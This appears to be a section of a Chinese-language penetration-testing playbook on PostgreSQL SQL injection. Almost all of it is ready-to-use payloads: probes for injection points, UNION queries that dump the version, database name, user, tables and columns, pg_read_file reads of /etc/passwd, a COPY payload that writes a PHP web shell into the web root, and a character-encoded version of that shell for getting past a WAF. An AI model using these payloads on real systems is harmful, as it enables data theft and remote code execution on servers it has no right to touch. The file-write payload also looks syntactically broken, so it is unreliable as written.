# PostgreSQL注入

## 4.1 基础探测 (sqli-postgres-basic)

### 执行步骤

#### 1. 探测注入点

```sql
' OR 1=1--
' OR '1'='1
' UNION SELECT NULL,NULL,NULL--
```

#### 2. 获取版本信息

```sql
' UNION SELECT version(),NULL--
' UNION SELECT current_database(),NULL--
' UNION SELECT current_user,NULL--
```

#### 3. 获取表名

```sql
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='public'--
```

#### 4. 获取列名

```sql
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

#### 5. 读取文件

```sql
' UNION SELECT pg_read_file('/etc/passwd'),NULL--
' UNION SELECT pg_read_binary_file('/etc/passwd'),NULL--
```

#### 6. 写入文件

```sql
' UNION SELECT 'test',COPY (SELECT '<?php system($_GET[c]);?>') TO '/var/www/html/shell.php'--
```

### WAF绕过

#### 编码绕过

```sql
' UNION SELECT chr(60)||chr(63)||'php system($_GET[c]);'||chr(63)||chr(62),NULL--
```
